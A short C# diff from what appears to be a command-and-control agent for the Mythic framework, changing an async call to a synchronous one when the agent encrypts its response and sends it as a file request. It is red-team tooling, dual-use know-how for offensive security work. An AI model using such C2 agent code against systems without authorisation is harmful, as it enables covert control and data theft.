@@ -108,7 +108,7 @@ namespace Agent.Profiles
                 string agentSha = "";
                 try
                 {
-                    string message = this.crypt.Encrypt(await messageManager.GetAgentResponseStringAsync());
+                    string message = this.crypt.Encrypt(messageManager.GetAgentResponseString());
                     Console.WriteLine("Message to Mythic!");
                     Console.WriteLine(message);
                     var createRequest = new CreateFileRequest(agentConfig.uuid, message, agentConfig.uuid);
